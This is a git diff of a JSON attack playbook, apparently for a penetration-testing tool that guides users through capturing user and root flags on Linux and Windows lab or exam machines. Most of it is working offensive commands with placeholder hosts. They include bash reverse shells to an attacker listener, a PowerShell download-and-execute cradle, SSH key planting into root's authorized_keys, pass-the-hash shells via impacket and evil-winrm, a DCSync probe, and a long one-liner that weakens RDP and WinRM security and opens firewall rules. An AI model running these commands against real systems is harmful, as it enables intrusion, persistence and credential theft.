@@ -22,7 +22,8 @@
         "linux"
       ],
       "produces": [
-        "objective.local_flag"
+        "objective.local_flag",
+        "proof.captured"
       ],
       "sequence": true,
       "hypothesis": "ANY Linux shell can read the user flag - a reverse shell or webshell reads user.txt/local.txt as readily as an SSH login, no credential required. Grab it first and mark the local objective done; the root flag is its own step once you escalate.",
@@ -32,13 +33,43 @@
       },
       "commands": [
         {
+          "tool": "ssh",
+          "locus": "onhost",
+          "requires_port": 22,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "SSH INTERACTIVE SHELL (When port 22 is open and credentials are known): Log in directly to an interactive shell on the target host.",
+          "run": "ssh {{user}}@{{target}}"
+        },
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "alt": true,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "ENABLE SSH KEY LOGIN (From remote command execution): Authorize your Kali SSH public key on the target account so you can SSH in interactively.",
+          "run": "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '{{ssh_pubkey}}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+        },
+        {
+          "tool": "bash",
+          "locus": "onhost",
+          "alt": true,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "REVERSE SHELL UPGRADE (From one-shot remote execution): Catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`).",
+          "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'"
+        },
+        {
           "tool": "sh",
           "locus": "onhost",
           "settled_by": [
             "objective.flag_located"
           ],
           "note": "IN YOUR SHELL (no credential needed): find every flag file and print the user flag with your identity for the screenshot. The common case - you do not need SSH creds to read a flag you can already reach.",
-          "run": "id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
+          "run": "whoami; id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
         },
         {
           "tool": "sshpass",
@@ -53,8 +84,14 @@
           "tool": "cat",
           "locus": "onhost",
           "win": true,
-          "note": "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag.",
-          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}"
+          "note": "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: whoami + id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag.",
+          "run": "whoami; id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "note": "REMOTE SSH PROOF READ (from Kali): Run id, hostname, ip addr, and cat the located user flag over SSH via NetExec.",
+          "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}'"
         }
       ],
       "deprioritize_when": [
@@ -74,7 +111,8 @@
         "linux"
       ],
       "produces": [
-        "objective.root_flag"
+        "objective.root_flag",
+        "proof.captured"
       ],
       "sequence": true,
       "hypothesis": "You have root - capture the proof flag before anything else so you can mark the box's final objective done. It lives in /root, which only root can read; grab it with your identity for the screenshot, then move on (persistence, pivot, loot) knowing the box is owned.",
@@ -84,20 +122,72 @@
       },
       "commands": [
         {
+          "tool": "ssh",
+          "locus": "onhost",
+          "requires_port": 22,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "ROOT SSH INTERACTIVE SHELL (When port 22 is open): Connect directly to an interactive root shell over SSH.",
+          "run": "ssh {{user}}@{{target}}"
+        },
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "alt": true,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "AUTHORIZE ROOT SSH KEY (From remote command execution): Plant your Kali SSH public key into /root/.ssh/authorized_keys to open an interactive root SSH session.",
+          "run": "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '{{ssh_pubkey}}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
+        },
+        {
+          "tool": "bash",
+          "locus": "onhost",
+          "alt": true,
+          "settled_by": [
+            "access.shell"
+          ],
+          "note": "ROOT REVERSE SHELL UPGRADE (From remote command execution): Catch an interactive root shell on your Kali listener (`nc -lvnp {{lport}}`).",
+          "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'"
+        },
+        {
           "tool": "find",
           "locus": "onhost",
           "settled_by": [
             "objective.flag_located"
           ],
           "note": "IN YOUR ROOT SHELL: locate the root/proof flag and print it alongside your root identity and IP address for the report screenshot.",
-          "run": "id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
+          "run": "whoami; id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
         },
         {
           "tool": "cat",
           "locus": "onhost",
           "win": true,
           "note": "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag - the box's final objective.",
-          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
+          "run": "whoami; id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
+        },
+        {
+          "tool": "cat",
+          "locus": "onhost",
+          "win": true,
+          "note": "COMBINED USER + ROOT PROOF READ (In-Session): Print host identity, IP, local flag, and root flag in one terminal frame when both paths have been located.",
+          "run": "whoami; id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}; cat {{flag_path_root}}"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "REMOTE SSH LOCATE (from Kali): Search /root for the root/proof flag over SSH via NetExec when root SSH credentials are known.",
+          "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'find /root -maxdepth 2 -type f \\( {{flag_inames_linux}} \\) 2>/dev/null'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "note": "REMOTE SSH PROOF READ (from Kali): Run id, hostname, ip addr, and cat the located root flag over SSH via NetExec.",
+          "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}'"
         }
       ],
       "deprioritize_when": [
@@ -118,13 +208,24 @@
         "access.admin",
         "access.system",
         "credential.available",
+        "credential.password",
+        "credential.plaintext",
         "smb.shares"
       ],
+      "credential_probe": {
+        "users": [
+          "administrator"
+        ],
+        "methods": [
+          "dcsync"
+        ]
+      },
       "os": [
         "windows"
       ],
       "produces": [
-        "objective.local_flag"
+        "objective.local_flag",
+        "proof.captured"
       ],
       "sequence": true,
       "hypothesis": "ANY Windows shell reads the user flag - a webshell, a WinRM session, or a service-exploit shell all read the user's Desktop\\local.txt, no credential required. Grab it first and mark the local objective done; the root/proof flag is its own step once you are SYSTEM/Administrator.",
@@ -156,20 +257,118 @@
           "note": "WINRM PASS-THE-HASH SHELL: Connect directly over WinRM with a captured NT hash."
         },
         {
-          "tool": "powershell",
+          "tool": "xfreerdp",
+          "locus": "onhost",
+          "requires_port": 3389,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "xfreerdp /v:{{target}} /u:'{{user}}' /p:'{{password}}' /d:{{domain}} /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution",
+          "note": "RDP INTERACTIVE DESKTOP (When port 3389 is open): Open a full interactive RDP desktop session on the target host."
+        },
+        {
+          "tool": "impacket-wmiexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 135/445 WMI INTERACTIVE SHELL (When WinRM 5985 is closed): Spawns a semi-interactive C:\\> prompt over WMI and SMB."
+        },
+        {
+          "tool": "impacket-psexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "impacket-psexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 445 INTERACTIVE SYSTEM SHELL: Spawns an interactive command prompt over SMB."
+        },
+        {
+          "tool": "impacket-smbexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "impacket-smbexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 445 SMBEXEC SHELL: Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_admin": true,
+          "settled_by": [
+            "host.rdp_enabled",
+            "host.winrm_enabled",
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x '(net localgroup \"Remote Management Users\" \"{{user}}\" /add & net localgroup \"Remote Desktop Users\" \"{{user}}\" /add & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & sc config TermService start= auto & net start TermService & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv6Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'",
+          "note": "ENABLE WINRM / RDP GROUP ACCESS (When direct login is blocked or ports 3389/5985 are closed): Grants your user Remote Management Users and Remote Desktop Users membership and enables RDP & WinRM. Paste the output back to unlock xfreerdp and evil-winrm.",
+          "web_note": "ENABLE RDP & WINRM REMOTELY: Adds your user to Remote Desktop Users and Remote Management Users and enables RDP (3389) and WinRM (5985). Paste output back to unlock xfreerdp and evil-winrm."
+        },
+        {
+          "tool": "nc",
+          "locus": "onhost",
+          "alt": true,
+          "requires_any": [
+            "foothold.windows",
+            "foothold.webshell",
+            "access.shell",
+            "access.admin",
+            "access.system"
+          ],
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
+          "run": "powershell -NoP -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{web_port}}/Invoke-PowerShellTcp.ps1')\"",
+          "note": "REVERSE SHELL UPGRADE: Execute from a one-shot command runner or service to catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`)."
+        },
+        {
+          "tool": "cmd",
           "locus": "onhost",
           "settled_by": [
             "objective.flag_located"
           ],
-          "note": "IN-SESSION LOCATE FIRST: Inside your Evil-WinRM shell, recursively search user profiles to verify the exact path of user.txt. Paste the path it prints and obol fills the read below.",
+          "note": "UNIVERSAL IN-SESSION LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user Desktops for the user/local flag file in under 1 second.",
+          "web_note": "STEP 2 (Inside your on-host shell): Locate the user flag across all user profile Desktops. Paste the path it prints to fill the proof read command below.",
+          "run": "cmd /c \"for /d %d in (C:\\Users\\*) do @dir /b /s %d\\Desktop\\*user*.txt %d\\Desktop\\*local*.txt 2>nul\""
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "IN-SESSION POWERSHELL LOCATE (For PS C:\\> shells like Evil-WinRM): Inside your interactive shell, recursively search user profiles to verify the exact path of the user flag. Paste the path it prints and obol fills the read below.",
           "run": "Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
         },
         {
           "tool": "cmd",
           "locus": "onhost",
           "win": true,
-          "note": "IN-SESSION PROOF READ: Display host identity, IP, and the flag in the same frame for the report screenshot. Ungates once the flag path is confirmed.",
-          "run": "hostname; ipconfig; type {{flag_path_local}}"
+          "note": "UNIVERSAL IN-SESSION PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Display whoami, hostname, ipconfig, and the located user flag in one command frame for the report screenshot.",
+          "web_note": "STEP 3 (Inside your on-host shell): Display whoami, hostname, ipconfig, and the user flag in a single command frame.",
+          "run": "cmd /c \"whoami & hostname & ipconfig & type {{flag_path_local}}\""
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
+          "win": true,
+          "note": "IN-SESSION POWERSHELL PROOF READ (For PS C:\\> shells like Evil-WinRM or powershell.exe): Display user identity (whoami), host identity (hostname), IP (ipconfig), and the located user flag in the same frame for the report screenshot.",
+          "run": "whoami; hostname; ipconfig; type {{flag_path_local}}"
         },
         {
           "tool": "nxc",
@@ -196,21 +395,23 @@
           "run": "nxc winrm {{target}} -u '{{user}}' -H '{{nthash}}' -x 'type {{flag_path_local}}'"
         },
         {
-          "tool": "smbclient",
-          "locus": "remote",
-          "requires_share": true,
-          "note": "SMB DIRECT CAPTURE (low-privileged domain credential, no shell required): On domain networks with a readable Users share (e.g. Active), grab user.txt directly over SMB from the user's Desktop. Works even when WinRM is closed and without any code execution on the target. If tree connect fails (NT_STATUS_BAD_NETWORK_NAME), use evil-winrm.",
-          "run": "smbclient '//{{target}}/Users' -U '{{domain}}/{{user}}%{{password}}' -c 'get {{user}}/Desktop/user.txt user.txt' && cat user.txt"
-        },
-        {
           "tool": "nxc",
           "locus": "remote",
           "requires_share": true,
-          "note": "LOCATE OVER SMB (from Kali): Spiders the Users share for flag files ending in .txt if the share exists.",
+          "note": "LOCATE OVER SMB (from Kali): Spiders the Users share to discover the exact path of the user/local flag file before reading it.",
+          "web_note": "WHY REMOTE SMB right now: Standard domain users cannot open an interactive shell when WinRM (5985) and RDP (3389) are closed. Spidering the Users share locates user.txt now; once you escalate to Administrator (e.g. Kerberoasting), Capture the Root/Proof Flag provides an On-Host Shell command to capture both user.txt and root.txt on-host with whoami/hostname/ipconfig.",
           "settled_by": [
             "objective.flag_located"
           ],
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --spider Users --regex \"(local|proof|user|root|flag)\\.txt$\""
+        },
+        {
+          "tool": "smbclient",
+          "locus": "remote",
+          "requires_share": true,
+          "note": "SMB SHARE CAPTURE (Ungates once the flag path is located on the Users share): Downloads and prints the located user flag from the discovered share path.",
+          "web_note": "REMOTE SMB CAPTURE: Downloads user.txt from the discovered Users share path. Once you obtain Administrator access, use On-Host Shell on the Root/Proof Flag card to capture your on-host proof screenshot for both user.txt and root.txt.",
+          "run": "smbclient '//{{target}}/Users' -U '{{domain}}/{{user}}%{{password}}' -c 'get \"{{flag_smb_path_local}}\" {{flag_name_local}}' && cat {{flag_name_local}}"
         },
         {
           "tool": "nxc",
@@ -257,17 +458,23 @@
       "requires_all": [],
       "requires_any": [
         "access.admin",
-        "access.system"
+        "access.system",
+        "access.admin_share"
       ],
       "credential_probe": {
-        "users": ["administrator"],
-        "methods": ["dcsync"]
+        "users": [
+          "administrator"
+        ],
+        "methods": [
+          "dcsync"
+        ]
       },
       "os": [
         "windows"
       ],
       "produces": [
-        "objective.root_flag"
+        "objective.root_flag",
+        "proof.captured"
       ],
       "sequence": true,
       "hypothesis": "Capture the proof flag using established administrative access, or test recovered Administrator material with a remote flag attempt. Paste the result to record the access actually demonstrated. For the proof screenshot, capture the flag with hostname and ipconfig in an established session.",
@@ -357,35 +564,182 @@
           "tool": "evil-winrm",
           "locus": "onhost",
           "requires_port": 5985,
-          "run": "evil-winrm -i {{target}} -u {{dauser}} -H {{dahash}}",
-          "note": "WINRM PASS-THE-HASH SHELL (Recommended when port 5985 is open): Connect directly over WinRM with the Administrator NT hash."
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
+          "note": "WINRM INTERACTIVE SHELL (When port 5985 is open or enabled): Connect directly over WinRM with administrative credentials.",
+          "web_note": "WINRM INTERACTIVE SHELL (Port 5985): Connect directly to an interactive PowerShell session as Administrator."
         },
         {
           "tool": "evil-winrm",
           "locus": "onhost",
           "requires_port": 5985,
-          "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
-          "note": "WINRM INTERACTIVE SHELL: Connect directly over WinRM with administrative credentials."
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "evil-winrm -i {{target}} -u {{dauser}} -H {{dahash}}",
+          "note": "WINRM PASS-THE-HASH SHELL (When port 5985 is open or enabled): Connect directly over WinRM with the Administrator NT hash.",
+          "web_note": "WINRM PASS-THE-HASH SHELL (Port 5985): Connect directly over WinRM using the Administrator NT hash."
         },
         {
-          "tool": "powershell",
+          "tool": "xfreerdp",
+          "locus": "onhost",
+          "requires_port": 3389,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "xfreerdp /v:{{target}} /u:'{{user}}' /p:'{{password}}' /d:{{domain}} /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution",
+          "note": "RDP INTERACTIVE DESKTOP (When port 3389 is open or enabled): Open a full interactive Administrator RDP desktop session.",
+          "web_note": "RDP INTERACTIVE DESKTOP (Port 3389): Launch a full graphical RDP desktop session as Administrator."
+        },
+        {
+          "tool": "impacket-wmiexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 135/445 WMI INTERACTIVE SHELL (Recommended when WinRM 5985 is closed, e.g. Active): Spawns a semi-interactive C:\\> prompt over WMI and SMB using administrative credentials.",
+          "web_note": "STEP 1 — GET ON HOST (Port 135/445 WMI Shell, no RDP/WinRM required): Spawns a semi-interactive C:\\> shell directly on the host as Administrator."
+        },
+        {
+          "tool": "impacket-wmiexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}}",
+          "note": "PORT 135/445 WMI PASS-THE-HASH SHELL: Spawns a semi-interactive C:\\> prompt over WMI and SMB using the Administrator NT hash."
+        },
+        {
+          "tool": "impacket-psexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "impacket-psexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 445 INTERACTIVE SYSTEM SHELL: Creates a service over SMB and opens an interactive shell running as NT AUTHORITY\\SYSTEM.",
+          "web_note": "ALT — PORT 445 SYSTEM SHELL (impacket-psexec): Opens an interactive C:\\Windows\\system32> shell as NT AUTHORITY\\SYSTEM."
+        },
+        {
+          "tool": "impacket-psexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "impacket-psexec -hashes ':{{dahash}}' {{dauser}}@{{target}}",
+          "note": "PORT 445 PASS-THE-HASH SYSTEM SHELL: Opens an interactive NT AUTHORITY\\SYSTEM shell over SMB using the Administrator NT hash."
+        },
+        {
+          "tool": "impacket-smbexec",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "impacket-smbexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+          "note": "PORT 445 SMBEXEC SHELL: Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_admin": true,
+          "settled_by": [
+            "host.rdp_enabled",
+            "host.winrm_enabled",
+            "access.admin_shell"
+          ],
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x '(net localgroup \"Remote Desktop Users\" \"{{user}}\" /add & net localgroup \"Remote Management Users\" \"{{user}}\" /add & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & sc config TermService start= auto & net start TermService & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv6Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'",
+          "note": "ENABLE RDP & WINRM GROUP ACCESS REMOTELY: Adds your account to Remote Desktop Users and Remote Management Users and enables RDP (3389) and WinRM (5985) on the host. Paste output to unlock xfreerdp and evil-winrm.",
+          "web_note": "WANT RDP OR WINRM? Run this one-liner from Kali to add your user to Remote Desktop Users & Remote Management Users and enable RDP (3389) and WinRM (5985), then paste the output back to unlock xfreerdp and evil-winrm."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_admin": true,
+          "settled_by": [
+            "host.rdp_enabled",
+            "host.winrm_enabled",
+            "access.admin_shell"
+          ],
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x '(net localgroup \"Remote Desktop Users\" \"{{dauser}}\" /add & net localgroup \"Remote Management Users\" \"{{dauser}}\" /add & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & sc config TermService start= auto & net start TermService & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv6Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'",
+          "note": "ENABLE RDP & WINRM GROUP ACCESS WITH NT HASH: Grants Remote Desktop Users and Remote Management Users and enables RDP and WinRM using the Administrator NT hash.",
+          "web_note": "ENABLE RDP & WINRM WITH NT HASH: Adds Administrator to Remote Desktop Users & Remote Management Users and enables RDP (3389) and WinRM (5985). Paste output to unlock xfreerdp and evil-winrm."
+        },
+        {
+          "tool": "nc",
+          "locus": "onhost",
+          "alt": true,
+          "requires_admin": true,
+          "settled_by": [
+            "access.admin_shell"
+          ],
+          "run": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{web_port}}/Invoke-PowerShellTcp.ps1')\"",
+          "note": "REVERSE SHELL UPGRADE: Run inside your wmiexec/psexec session or via remote execution to catch a full PowerShell reverse shell on your Kali listener (`nc -lvnp {{lport}}`)."
+        },
+        {
+          "tool": "cmd",
           "locus": "onhost",
           "settled_by": [
             "objective.flag_located"
           ],
-          "run": "Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *root*.txt,*proof*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName",
-          "note": "ON-HOST POWERSHELL LOCATE: If you have an interactive shell, search Desktops for root/proof flag files in under 1 second. Paste the path it prints to ungate the read command below."
+          "note": "UNIVERSAL ON-HOST LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user profile Desktops for root/proof and user/local flags in under 1 second.",
+          "web_note": "STEP 2 (Inside your on-host C:\\> or PS shell): Sweep all user Desktops for both user.txt and root.txt. Paste the paths back to fill the proof read commands below.",
+          "run": "cmd /c \"for /d %d in (C:\\Users\\*) do @dir /b /s %d\\Desktop\\*root*.txt %d\\Desktop\\*proof*.txt %d\\Desktop\\*user*.txt %d\\Desktop\\*local*.txt 2>nul\""
         },
         {
           "tool": "cmd",
           "locus": "onhost",
           "win": true,
-          "run": "whoami; hostname; ipconfig; type {{flag_path_root}}",
-          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report."
+          "note": "ONE-SHOT ON-HOST USER + ROOT LOCATE & PROOF READ (Works in CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM without needing paths first): Prints whoami, hostname, ipconfig, and every user/local and root/proof flag across all Desktops in one frame.",
+          "web_note": "ONE-SHOT ON-HOST USER + ROOT PROOF (Run inside your on-host shell): Prints whoami, hostname, ipconfig, and both user.txt and root.txt across all Desktops in a single screenshot frame.",
+          "run": "cmd /c \"whoami & hostname & ipconfig & for /d %d in (C:\\Users\\*) do @for %f in (%d\\Desktop\\*user*.txt %d\\Desktop\\*local*.txt %d\\Desktop\\*root*.txt %d\\Desktop\\*proof*.txt) do @(echo --- %~f --- & type %~f 2>nul)\""
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "run": "Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *root*.txt,*proof*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName",
+          "note": "ON-HOST POWERSHELL LOCATE (For PS C:\\> shells like Evil-WinRM): If you have an interactive PowerShell session, search Desktops for root/proof flag files in under 1 second. Paste the path it prints to ungate the read command below."
         },
         {
           "tool": "cmd",
           "locus": "onhost",
+          "win": true,
+          "run": "cmd /c \"whoami & hostname & ipconfig & type {{flag_path_root}}\"",
+          "note": "UNIVERSAL ON-HOST PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Capture whoami, hostname, ipconfig, and the ROOT/proof flag in a single command frame.",
+          "web_note": "STEP 3 (Inside your on-host shell): Capture whoami, hostname, ipconfig, and the located root/proof flag in a single screenshot frame."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "win": true,
+          "run": "cmd /c \"whoami & hostname & ipconfig & type {{flag_path_local}} & type {{flag_path_root}}\"",
+          "note": "COMBINED USER + ROOT PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): If you initially grabbed the user flag over SMB without an interactive shell, run this inside your Admin shell to capture both user and root flags alongside whoami, hostname, and ipconfig for your exam report.",
